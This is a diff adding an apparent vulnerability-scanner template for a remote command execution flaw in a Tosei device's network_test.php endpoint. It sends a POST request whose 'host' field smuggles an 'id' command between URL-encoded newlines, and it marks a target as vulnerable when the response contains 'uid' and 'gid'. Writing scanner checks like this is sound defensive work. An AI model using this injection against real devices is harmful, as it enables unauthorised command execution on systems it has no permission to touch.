@@ -1,0 +1,30 @@
+id: Tosei-network_test-rce
+
+info:
+  name: Tosei-network_test-rce
+  author: iSee857
+  severity: critical
+  description: |
+    Tosei-network_test-rce.
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/login.php/cgi-bin/network_test.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        host=%0aid%0a&command=ping
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - gid
+          - uid
+        condition: and
+
+      - type: status
+        status:
+          - 200
